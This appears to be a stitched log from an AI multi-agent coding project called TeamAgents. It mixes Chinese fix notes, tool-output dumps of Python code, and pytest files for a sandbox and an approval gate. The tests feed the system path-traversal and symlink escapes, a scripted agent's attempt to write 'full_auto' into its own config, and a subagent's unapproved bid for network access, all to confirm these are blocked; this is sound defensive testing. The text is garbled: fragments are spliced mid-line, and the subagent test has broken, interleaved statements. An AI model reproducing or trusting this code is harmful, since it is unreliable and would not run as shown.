本修复只处理**已停等**（无 executor）的 WAITING_APPROVAL 回合，不改变 RUNNING 回合的取消时机。\n- 重启后遗留的 WAITING_APPROVAL 回合（RT-04/AD-7，reconcile 不覆盖 WAITING_*）不在本任务；\n  本次只在「取消/终结」路径消除残留批准。若未来要做，可在 reconcile 中补 WAITING_* 的收敛。\n\n## 结果（Leader 复跑，2026-09-12 12:2x）\n\n- 新测试：`.venv/bin/python -m pytest tests/test_p0_4_reduce_rollback.py tests/test_rt06_approval_expiry.py -q` → **16 passed**。\n- 全套件：`.venv/bin/python -m pytest tests/ -q` → **109 passed, 2 failed, 12 deselected**；两个失败与基线完全相同（缺 DEEPSEEK_API_KEY、无 DNS），无新失败。\n- 代码审读：submit 重构为 `_submit_once` + 外层 except 新事务记失败回执（回滚在 tx.__exit__）；expire_approval 泛化为 (PENDING|APPROVED_ONCE)→EXPIRED；expire_run_approvals + control.expire_run_approvals 审计事件；_finalize/reconcile/_request_stop 终止路径接入；_schedule 对 cancel_requested 的 WAITING_APPROVAL 回合收敛；_cancel_task 对停等回合改走取消请求。\n- 状态：实现与测试完成；本文件由 Leader 补齐结果段（原回合在补报告前撞上 step 上限，任务已不可由承接者关闭）。\n# TUI 修复笔记（impl_tui）\n\n任务：task_fcf54d8eb724 —— 修复审查报告 A-03（任务视图缺取消操作）与 B-02（周期刷新整体失效）。\n文件所有权：仅 `src/teamagents/tui/*` + 新增 `tests/test_*.py`。\n\n## 基线复现（改动前）\n\n命令：\n\n```bash\ncd /home/rimuru/Projects/Code/for_fun/TeamAgents\nrm -rf /tmp/ta-repro\nPYTHONPATH=tests XDG_STATE_HOME=/tmp/ta-repro/state XDG_CONFIG_HOME=/tmp/ta-repro/config \\\n  .venv/bin/python review/tmp/repro_surface.py\n```\n\n关键输出（2026-09-12，textual 8.2.8，Python 3.13.15）：\n\n```\n[B-02] query_one('#status', StatusBar) -&gt; WrongType Node matching '#status' is the wrong type; expected type 'StatusBar', found Static(id='sta\n[B-02] status text: ''\n[B-02] LogPanel.refresh_from called by periodic refresh: 0\n[B-06] log-stream lines after opening log tab: 0\n```\n\n另用临时探针确认：textual 8.2.8 下 7 个 TabPane 面板在启动时就全部挂载（非懒加载），\n所以周期刷新可以对已挂载面板逐个安全刷新；`on_panel_ready` 对 LogPanel 用错了签名\n（3 参数 vs 4 参数），异常被 suppress 吞掉。\n\n## 修复方案\n\n- B-02：`compose` 产出 <message type="tool">{"ok": true, "exit_code": 0, "output": "        proc.wait(timeout=5)\n    except subprocess.TimeoutExpired:\n        try:\n            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)\n        except ProcessLookupError:\n            pass\n\n\ndef _save_artifact(output: str, artifact_dir: Path | None) -&gt; str | None:\n    if artifact_dir is None:\n        return None\n    artifact_dir.mkdir(parents=True, exist_ok=True)\n    name = f\"exec-{time.strftime('%Y%m%d-%H%M%S')}-{os.getpid()}.log\"\n    path = artifact_dir / name\n    path.write_text(output, encoding=\"utf-8\")\n    return f\"/artifacts/{name}\"\n\n\n# ---------------------------------------------------------------------------\n# Deep Agents backends\n# ---------------------------------------------------------------------------\n\n\nclass GuardedFilesystemBackend(FilesystemBackend):\n    \"\"\"FilesystemBackend with symlink-aware containment under its root.\n\n    String prefix checks are not acceptable (plan section 12.2): every write\n    resolves the real path (including symlinked parents) and refuses escapes.\n    Reads of symlinks pointing outside the root are refused too.\n    \"\"\"\n\n    def __init__(self, root_dir: str | Path, max_file_size_mb: int = 10):\n        super().__init__(root_dir=root_dir, virtual_mode=True,\n                         max_file_size_mb=max_file_size_mb)\n        self._root_real = Path(root_dir).resolve()\n\n    def _resolve_path(self, key: str) -&gt; Path:\n        \"\"\"One guard for every file operation: real path (symlinks included) must\n        stay under the authorized root.\"\"\"\n        try:\n            resolved = super()._resolve_path(key)\n        except ValueError as e:\n            # normalize the base class' traversal rejection into a guard error so\n            # tool-level callers get a result instead of an exception\n            raise PermissionError(\n                f\"path {key!r} rejected: {e}\") from e\n        root = self._root_real\n        probe, tail = resolved, []\n        while not probe.exists() and probe != probe.parent:\n            tail.append(probe.name)\n            probe = probe.parent\n        real = probe.resolve()\n        if tail:\n            real = real.joinpath(*reversed(tail))\n        try:\n            real.relative_to(root)\n        except ValueError as e:\n            raise PermissionError(\n                f\"path {key!r} resolves outside the authorized directory \"\n                f\"({real} is not under {root})\") from e\n        return resolved\n\n\nclass ReadOnlyFilesystemBackend(GuardedFilesystemBackend):\n    \"\"\"Guarded backend that refuses every mutation (memory/skills routes).\n\n    The model may read these locations but must never write them: the error is\n    returned as a failed operation result (never raised), so the tool call\n    fails cleanly and the turn continues (plan section 12.2).\n    \"\"\"\n\n    def __init__(self, root_dir: str | Path, *, virtual_prefix: str = \"\",\n                 max_file_size_mb: int = 10):\n        super().__init__(root_dir, max_file_size_mb=max_file_size_mb)\n        # route prefix stripped by CompositeBackend, echoed so the model sees\n        # the path it actually asked for\n        self._virtual_prefix = virtual_prefix.rstrip(\"/\")\n\n    def _reject(self, path: str) -&gt; str:\n        shown = f\"{self._virtual_prefix}/{path.lstrip('/')}\"\n        return (f\"Error: {shown} is read-only for members; this location is owned \"\n                f\"by the user and cannot be modified\")\n\n    def write(self, file_path: str, content: str) -&gt; WriteResult:\n        return WriteResult(error=self._reject(file_path))\n\n    def edit(self, file_path: str, old_string: str, new_string: str,\n             replace_all: bool = False) -&gt; EditResult:\n        return EditResult(error=self._reject(file_path))\n\n    def delete(self, file_path: str) -&gt; DeleteResult:\n        return DeleteResult(error=self._reject(file_path))\n\n    def upload_files(self, files: list[tuple[str, bytes]]) -&gt; list[FileUploadResponse]:\n        return [FileUploadResponse(path=path, error=\"permission_denied\")\n                for path, _content in files]\n\n\nclass IsolatedShellBackend(GuardedFilesystemBackend):\n    \"\"\"Filesystem backend whose `execute` runs inside bubblewrap (plan §12.2).\n\n", "truncated": false, "artifact": null}</message>

<message type="tool">{"ok": true, "exit_code": 0, "output": "                content=\"Approval no longer matches this call (parameters or policy \"\n                        \"changed). Request approval again.\",\n                tool_call_id=tool_call_id, name=name, status=\"error\")\n        result = await handler(request)\n        self.approvals.consume_once(approval.approval_id)\n        return result\n\n\nclass SubagentGate(AgentMiddleware):\n    \"\"\"Permission ceiling for private subagents (plan section 6.4).\n\n    A private subagent belongs to the member: it may use everything the\n    member's policy already allows (including session-scoped approvals) and its\n    model calls consume the member's own step budget. Operations that would\n    need a *new* user approval are refused outright -- a nested `interrupt()`\n    raised inside the `task` tool cannot reliably resume (replay loses the\n    approved call, `recheck` then rejects it), and leaving a pending approval\n    the user cannot act on would block `signal_done`. The member's own turn can\n    still request the same operation.\n    \"\"\"\n\n    name = \"teamagents-subagent\"\n\n    def __init__(self, *, runner: \"DeepAgentsRunner\", approvals: ApprovalGate,\n                 steps: TeamAgentMiddleware):\n        self.runner = runner\n        self.approvals = approvals\n        self.steps = steps\n\n    async def awrap_model_call(self, request, handler):\n        self.steps.model_steps += 1\n        if self.steps.model_steps &gt; self.steps.max_model_steps:\n            raise TurnLimitExceeded(\n                f\"model-step limit {self.steps.max_model_steps} reached for this turn\")\n        return await handler(request)\n\n    async def awrap_tool_call(self, request, handler):\n        name = request.tool_call[\"name\"]\n        args = request.tool_call.get(\"args\") or {}\n        tool_call_id = request.tool_call.get(\"id\") or f\"subagent:{name}\"\n        if name in TEAM_TOOLS:\n            return ToolMessage(\n                content=\"Team tools are not available to private subagents; the \"\n                        \"member performs team actions in its own turn.\",\n                tool_call_id=tool_call_id, name=name, status=\"error\")\n        if name in self.runner.bound_tool_names():\n            # MCP/web tools exist only because the user bound them (section 12.1)\n            return await handler(request)\n        decision = self.approvals.policy.evaluate(name, args)\n        session_ok = self.approvals.store.find_session_approval(\n            self.approvals.session_id, operation_hash(name, args)) is not None\n        if decision.allow or session_ok:\n            return await handler(request)\n        return ToolMessage(\n            content=f\"Blocked by team permissions: {name} needs explicit user \"\n                    \"approval and a private subagent cannot raise approval \"\n                    \"requests. Ask the member to perform this operation in its \"\n                    \"own turn, or choose an approach already within scope.\",\n            tool_call_id=tool_call_id, name=name, status=\"error\")\n\n\nclass DeepAgentsRunner:\n    \"\"\"One built-in member: its own persistent Deep Agents graph.\"\"\"\n\n    def __init__(self, *, agent: AgentSpec, catalog: UserConfig, session_id: str,\n                 workdir: Path, artifacts_dir: Path, checkpointer,\n                 approvals: ApprovalGate, extra_tools: list[BaseTool] | None = None,\n                 skills_dirs: list[Path] | None = None,\n                 memory_files: list[Path] | None = None,\n                 extra_rw: list[Path] | None = None, model_override=None):\n        self.agent = agent\n        self.catalog = catalog\n        self.session_id = session_id\n        self.workdir = Path(workdir)\n        self.artifacts_dir = Path(artifacts_dir)\n        self.checkpointer = checkpointer\n        self.approvals = approvals\n        self.extra_tools = extra_tools or []\n        self.skills_dirs = [Path(p) for p in (skills_dirs or [])]\n        self.memory_files = [Path(p) for p in (memory_files or [])]\n        self.extra_rw = [Path(p) for p in (extra_rw or [])]\n== build_backend/GP ==\n\n    def _thread_id(self, run: TurnRun) -&gt; str:\n        epoch = (run.context_ref or \"ctx:0\").rsplit(\":\", 1)[-1]\n        return f\"{self.session_id}:{self.agent.id}:{epoch}\"\n\n    def _build_backend(self) -&gt; CompositeBackend:\n        # every route is guarded (real-path containment, plan section 12.2):\n        # artifacts stay writable, memory/skills are user-owned and read-only\n        routes: dict[str, Any] = {\n            # route keys end with '/' — CompositeBackend joins them verbatim\n            \"/artifacts/\": GuardedFilesystemBackend(root_dir=self.artifacts_dir),\n        }\n        for i, skills_dir in enumerate(self.skills_dirs):\n            if skills_dir.is_dir():\n                routes[f\"/skills/{i}/\"] = ReadOnlyFilesystemBackend(\n                    root_dir=skills_dir, virtual_prefix=f\"/skills/{i}/\")\n        for i, memory_file in enumerate(self.memory_files):\n            if memory_file.is_file():\n                routes[f\"/memory/{i}/\"] = ReadOnlyFilesystemBackend(\n                    root_dir=memory_file.parent, virtual_prefix=f\"/memory/{i}/\")\n        default = IsolatedShellBackend(self.workdir, artifacts_dir=self.artifacts_dir,\n                                       extra_rw=self.extra_rw, network=False)\n        return CompositeBackend(default=default, routes=routes)\n\n    def _shell_tool(self) -&gt; BaseTool:\n        runner = self\n\n        @tool\n        async def shell(command: str, timeout: int = 120, network: bool = False,\n                  tool_call_id: Annotated[str, InjectedToolCallId] = \"\") -&gt; str:\n            \"\"\"Run a shell command in the isolated Linux sandbox (no network by\n            default; network=true requires user approval). Output is capped and\n            long output is stored under /artifacts.\"\"\"\n            # permission (including network escalation) is decided once, by\n            # TeamAgentMiddleware.awrap_tool_call, before this body runs\n            import asyncio\n            result = await asyncio.to_thread(\n                run_isolated, command, workdir=runner.workdir, timeout=timeout,\n                network=network, extra_rw=runner.extra_rw,\n                artifact_dir=runner.artifacts_dir)\n            return json.dumps({\"ok\": True, \"exit_code\": result.exit_code,\n                               \"output\": result.output,\n                               \"truncated\": result.truncated,\n                               \"artifact\": result.artifact}, ensure_ascii=False)\n\n        return shell\n\n    def _general_purpose_spec(self, model, tools: list[BaseTool]) -&gt; dict[str, Any]:\n        \"\"\"Explicit `general-purpose` spec, replacing the one deepagents auto-adds.\n\n        The auto-added default carried no TeamAgentMiddleware, so anything a\n        private subagent did (including shell network escalation) skipped both\n        the approval gate and the step budget. This spec keeps the capability\n        but binds it to the member: `SubagentGate` applies the same policy and\n        shares the step counter; the subagent gets the execution tools only\n        (team-coordination tools stay with the member's own turn).\n        \"\"\"\n        return {\n            \"name\": GENERAL_PURPOSE_SUBAGENT[\"name\"],\n            \"description\": GENERAL_PURPOSE_SUBAGENT[\"description\"],\n            \"system_prompt\": GENERAL_PURPOSE_SUBAGENT[\"system_prompt\"],\n            \"model\": model,\n            \"tools\": [t for t in tools if t.name not in TEAM_TOOLS],\n            \"middleware\": [SubagentGate(runner=self, approvals=self.approvals,\n                                        steps=self._middleware)],\n        }\n\n    def _ensure_graph(self, run: TurnRun):\n        if self._graph is not None and self._graph_revision == run.config_revision:\n            return self._graph\n        if self.model_override is not None:\n            model = self.model_override\n        else:\n            profile = resolve_profile(self.catalog, self.agent.model_profile)\n            model = build_chat_model(profile)\n        # the turn bound is spec data, never a literal: read it at graph (re)build\n        limits = self.approvals.store.load_team_spec(self.session_id).limits\n        self._middleware = TeamAgentMiddleware(\n            runner=self, approvals=self.approvals,\n            max_model_steps=limits.max_model_steps_per_turn)\n        tools = [*build_team_tools(self), self._shell_tool(),\n                 *(self._bound_tools or []), *self.extra_tools]\n        skills = [f\"/skills/{i}/\" for i, d in enumerate(self.skills_dirs) if d.is_dir()]\n        memory = [f\"/memory/{i}/{f.name}\" for i, f in enumerate(self.memory_files)\n                  if f.is_file()]\n        self._graph = create_deep_agent(\n            model=model,\n            tools=tools,\n            system_prompt=self.agent.instructions or None,\n            middleware=[self._middleware],\n            backend=self._build_backend(),\n            subagents=[self._general_purpose_spec(model, tools)],\n            skills=skills or None,\n            memory=memory or None,\n            checkpointer=self.checkpointer,\n            name=self.agent.id,\n        )\n        self._graph_revision = run.config_revision\n        return self._graph\n\n    # ------------------------------------------------------- AgentRunner API\n", "truncated": false, "artifact": null}</message>

str:\n        \"\"\"Deterministic per action id, unique even for several tasks in one run.\"\"\"\n        if explicit := action.payload.get(\"task_id\"):\n            return str(explicit)\n        digest = hashlib.sha256(action.action_id.encode()).hexdigest()[:12]\n        return f\"task_{digest}\"\n\n    @staticmethod\n    def _payload_hash(action: TeamAction) -&gt; str:\n        blob = json.dumps(action.payload, sort_keys=True, ensure_ascii=False)\n        return hashlib.sha256(blob.encode()).hexdigest()[:32]\n\n    # ------------------------------------------------------------ public API\n\n    def schedule(self) -&gt; <message type="tool">{"ok": true, "exit_code": 0, "output": "\"\"\"P3/T23: member file routes stay inside their authorized roots and the\nuser-owned memory/skills locations are read-only (review P0-1).\"\"\"\n\nfrom __future__ import annotations\n\nimport os\n\nfrom conftest import Harness, leader, spec_of\nfrom scripted_model import ScriptedChatModel, ai_text, ai_tool\nfrom teamagents.execution import GuardedFilesystemBackend, ReadOnlyFilesystemBackend\nfrom teamagents.models import ModelProfile, UserConfig\nfrom teamagents.permissions import ApprovalGate, PermissionPolicy\nfrom teamagents.runners import DeepAgentsRunner\nfrom teamagents.runtime import SessionRuntime\nfrom teamagents.storage import Store\n\n\ndef tool_messages(model: ScriptedChatModel, name: str | None = None) -&gt; list:\n    out = [m for call in model.calls for m in call if type(m).__name__ == \"ToolMessage\"]\n    return [m for m in out if name is None or m.name == name]\n\n\n# -- backend level -----------------------------------------------------------\n\n\ndef test_read_only_backend_refuses_writes_and_reads_still_work(tmp_path):\n    root = tmp_path / \"config\"\n    root.mkdir()\n    (root / \"AGENTS.md\").write_text(\"project rules\\n\", encoding=\"utf-8\")\n    backend = ReadOnlyFilesystemBackend(root, virtual_prefix=\"/memory/0/\")\n\n    write = backend.write(\"/AGENTS.md\", \"INJECTED\\n\")\n    assert write.error and \"read-only\" in write.error\n    assert (root / \"AGENTS.md\").read_text(encoding=\"utf-8\") == \"project rules\\n\"\n\n    assert backend.edit(\"/AGENTS.md\", \"project\", \"no\").error\n    assert backend.delete(\"/AGENTS.md\").error\n    assert backend.upload_files([(\"/new.txt\", b\"x\")])[0].error == \"permission_denied\"\n    assert not (root / \"new.txt\").exists()\n\n    read = backend.read(\"/AGENTS.md\")\n    assert read.error is None\n    assert \"project rules\" in read.file_data[\"content\"]\n\n\ndef test_guarded_backend_refuses_symlink_and_traversal_escapes(tmp_path):\n    root = tmp_path / \"root\"\n    root.mkdir()\n    (root / \"ok.txt\").write_text(\"ok\\n\", encoding=\"utf-8\")\n    outside = tmp_path / \"outside\"\n    outside.mkdir()\n    (outside / \"secret.txt\").write_text(\"secret\\n\", encoding=\"utf-8\")\n    os.symlink(outside, root / \"link\")\n\n    guarded = GuardedFilesystemBackend(root)\n    assert guarded.write(\"/../evil.txt\", \"x\").error is not None\n    assert not (tmp_path / \"evil.txt\").exists()\n\n    assert guarded.write(\"/link/evil.txt\", \"x\").error is not None\n    assert guarded.read(\"/link/secret.txt\").error is not None\n    assert guarded.edit(\"/link/secret.txt\", \"secret\", \"stolen\").error is not None\n    assert guarded.delete(\"/link\").error is not None\n    assert not (outside / \"evil.txt\").exists()\n    assert (outside / \"secret.txt\").read_text(encoding=\"utf-8\") == \"secret\\n\"\n\n    # normal operations inside the root keep working\n    assert guarded.write(\"/ok.txt\", \"still ok\\n\").error is None\n    assert guarded.read(\"/ok.txt\").file_data[\"content\"] == \"still ok\\n\"\n\n\n# -- end to end through the member graph -------------------------------------\n\n\nasync def test_member_file_routes_guard_memory_skills_and_artifacts(tmp_path):\n    work = tmp_path / \"work\"\n    work.mkdir()\n    artifacts = tmp_path / \"artifacts\"\n    artifacts.mkdir()\n    cfg = tmp_path / \"home\" / \".config\" / \"teamagents\"\n    (cfg / \"skills\" / \"reporting\").mkdir(parents=True)\n    (cfg / \"AGENTS.md\").write_text(\"project rules\\n\", encoding=\"utf-8\")\n    skill_text = \"---\\nname: reporting\\ndescription: write reports\\n---\\norig skill\\n\"\n    (cfg / \"skills\" / \"reporting\" / \"SKILL.md\").write_text(skill_text, encoding=\"utf-8\")\n    outside = tmp_path / \"outside\"\n    outside.mkdir()\n    os.symlink(outside, artifacts / \"escape\")\n\n    spec = spec_of(leader(), channels=[])\n    store = Store(tmp_path / \"s1.db\")\n    store.create_session(\"s1\", str(work), \"approved_scope\")\n    store.save_team_spec(\"s1\", spec)\n    for agent in spec.agents:\n        store.ensure_agent(\"s1\", agent.id)\n\n    model = ScriptedChatModel(script=[\n        ai_tool(\"write_file\", {\"file_path\": \"/memory/0/config.toml\",\n                               \"content\": \"mode = 'full_auto'\\n\"}),\n        ai_tool(\"write_file\", {\"file_path\": \"/skills/0/reporting/SKILL.md\",\n                               \"content\": \"INJECTED\\n\"}),\n        ai_tool(\"write_file\", {\"file_path\": \"/artifacts/report.txt\",\n                               \"content\": \"artifact body\\n\"}),\n        ai_tool(\"write_file\", {\"file_path\": \"/artifacts/escape/pwn.txt\",\n                               \"content\": \"escaped\\n\"}),\n        ai_tool(\"write_file\", {\"file_path\": \"/note.txt\", \"content\": \"inside\\n\"}),\n        ai_tool(\"read_file\", {\"file_path\": \"/memory/0/AGENTS.md\"}),\n        ai_tool(\"signal_done\", {\"summary\": \"ok\"}),\n        ai_text(\"done\"),\n    ])\n    catalog = UserConfig(models={\"test\": ModelProfile(provider=\"openai\", model=\"test\")})\n    approvals = ApprovalGate(store, \"s1\", PermissionPolicy())\n    from langgraph.checkpoint.memory import InMemorySaver\n    runner = DeepAgentsRunner(agent=spec.agents[0], catalog=catalog, session_id=\"s1\",\n                              workdir=work, artifacts_dir=artifacts,\n                              checkpointer=InMemorySaver(), approvals=approvals,\n                              skills_dirs=[cfg / \"skills\"], memory_files=[cfg / \"AGENTS.md\"],\n                              model_override=model)\n    rt = SessionRuntime(store, \"s1\", catalog, runners={\"leader\": runner},\n                        approvals=approvals)\n    h = Harness(rt, {})\n    await h.start()\n    try:\n        rt.user_message(\"write some files\")\n        assert await rt.settle(30), \"session did not settle\"\n\n        # user-owned locations are untouched and the escape never lands\n        assert not (cfg / \"config.toml\").exists()\n        assert (cfg / \"skills\" / \"reporting\" / \"SKILL.md\").read_text() == skill_text\n        assert not (outside / \"pwn.txt\").exists()\n\n        # authorized writes still work\n        assert (artifacts / \"report.txt\").read_text() == \"artifact body\\n\"\n        assert (work / \"note.txt\").read_text() == \"inside\\n\"\n\n        writes = {m.tool_call_id: m for m in tool_messages(model, \"write_file\")}\n        assert len(writes) == 5\n        errors = [m.content for m in writes.values() if m.status == \"error\"]\n        assert len(errors) == 3, [m.content for m in writes.values()]\n        assert all(\"read-only\" in e for e in errors[:2]), errors\n        assert \"outside\" in errors[2] and \"root directory\" in errors[2], errors[2]\n        assert all(m.status == \"success\" for m in tool_messages(model, \"write_file\")\n                   if m.content.startswith(\"Updated file /artifacts/report.txt\")\n                   or m.content.startswith(\"Updated file /note.txt\"))\n\n        reads = tool_messages(model, \"read_file\")\n        assert reads and \"project rules\" in reads[-1].content\n        assert not store.pending_approvals(\"s1\"), \"file tools must not ask for approval\"\n        assert rt.store.get_session(\"s1\")[\"goal_state\"] == \"done\"\n        assert [r.status for r in store.runs_for_session(\"s1\")] == [\"COMPLETED\"]\n    finally:\n        await rt.close()\n        store.close()\n\n\ndef test_artifacts_route_is_writable_for_members(tmp_path):\n    \"\"\"The artifacts route must not regress into read-only (existing behavior).\"\"\"\n    artifacts = tmp_path / \"artifacts\"\n    artifacts.mkdir()\n    backend = GuardedFilesystemBackend(artifacts)\n    assert backend.write(\"/sub/out.txt\", \"data\\n\").error is None\n    assert (artifacts / \"sub\" / \"out.txt\").read_text() == \"data\\n\"\n==== SUBAGENT TEST ====\n\"\"\"P0-2/T15: the private `general-purpose` subagent stays inside the member's\npermission ceiling -- no zero-approval escalation, model calls count against the\nmember's step budget.\"\"\"\n\nfrom __future__ import annotations\n\nimport asyncio\n\nfrom conftest import Harness, leader, spec_of\nfrom scripted_model import ScriptedChatModel, ai_text, ai_tool\nfrom teamagents.models import ModelProfile, TeamAction, UserConfig\nfrom teamagents.permissions import ApprovalGate, PermissionPolicy\nfrom teamagents.runners import DeepAgentsRunner\nfrom teamagents.runtime import SessionRuntime\nfrom teamagents.storage import Store\n\n\ndef build_runtime(tmp_path, script):\n    work = tmp_path / \"work\"\n    work.mkdir()\n    spec = spec_of(leader(), channels=[])\n    store = Store(tmp_path / \"s1.db\")\n    store.create_session(\"s1\", str(work), \"approved_scope\")\n    store.save_team_spec(\"s1\", spec)\n    for agent in spec.agents:\n        store.ensure_agent(\"s1\", agent.id)\n    model = ScriptedChatModel(script=script)\n    catalog = UserConfig(models={\"test\": ModelProfile(provider=\"openai\", model=\"test\")})\n    approvals = ApprovalGate(store, \"s1\", PermissionPolicy())\n    from langgraph.checkpoint.memory import InMemorySaver\n    runner = DeepAgentsRunner(agent=spec.agents[0], catalog=catalog, session_id=\"s1\",\n                              workdir=work, artifacts_dir=tmp_path / \"artifacts\",\n                              checkpointer=InMemorySaver(), approvals=approvals,\n                              model_override=model)\n    runtime = SessionRuntime(store, \"s1\", catalog, runners={\"leader\": runner},\n                             approvals=approvals)\n    return runtime, runner, model, store\n\n\nasync def test_general_purpose_subagent_cannot_escalate_without_approval(tmp_path):\n    rt, runner, model, store = build_runtime(tmp_path, [\n        ai_tool(\"task\", {\"subagent_type\": \"general-purpose\",\n                         \"description\": \"check the network\"}),\n        ai_tool(\"shell\", {\"command\": \"echo sub-ok\"}),                 # in scope\n        ai_tool(\"shell\", {\"command\": \"echo NET-ESCAPED\", \"network\": True}),\n        ai_text(\"subagent done\"),\n        ai_tool(\"signal_done\", {\"summary\": \"ok\"}),\n        ai_text(\"done\"),\n    ])\n    h = Harness(rt, {})\n    await h.start()\n    try:\n        rt.user_message(\"check the network\")\n        deadline = asyncio.get_event_loop().time() + 20\n        while not store.pending_approvals(\"s1\")[0]\n        assert task_approval.requested_scope[\"tool\"] == \"task\"\n        rt.submit(TeamAction(action_id=\"dec-1\", session_id=\"s1\", actor_id=\"user\",\n                             kind=\"approval_decision\",\n                             payload={\"approval_id\": task_approval.approval_id,\n                                      \"decision\": \"session\"}))\n        assert await rt.settle(30), \"session did not settle\"\n\n        # the subagent's in-scope shell ran (capability kept) ...\n        contents = [m.content for call in network escalation never executed, without a new approval\n        assert not any(\"NET-ESCAPED\" in c for c in contents), contents\n        assert any(\"Blocked by team permissions\" in c for c in model calls count against the member's own step budget:\n        # after the approval resume the member itself makes only 2 model calls\n        # (signal_done + final text), so &gt;= 4 proves the subagent's 3 calls ran\n        # through the shared counter\n        assert 4 &lt;= runner._middleware.model_steps &lt;= len(model.calls), \\\n            (runner._middleware.model_steps,
